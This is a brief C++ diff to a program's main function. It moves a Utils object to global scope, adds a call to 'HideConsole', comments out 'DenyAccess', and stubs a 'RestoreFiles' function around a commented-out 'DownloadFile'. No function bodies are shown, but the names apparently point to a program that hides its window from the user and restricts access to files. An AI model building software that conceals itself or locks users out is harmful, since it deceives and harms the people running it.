@@ -16,10 +16,12 @@
 
 using namespace std;
 
+Utils utils;
+
 int main()
 {
-	Utils utils;
-	utils.DenyAccess();
+	utils.HideConsole();
+	//utils.DenyAccess();
 
 	while (true)
 	{
@@ -32,3 +34,7 @@ int main()
     return 0;
 }
 
+void RestoreFiles()
+{
+	//utils.DownloadFile();
+}
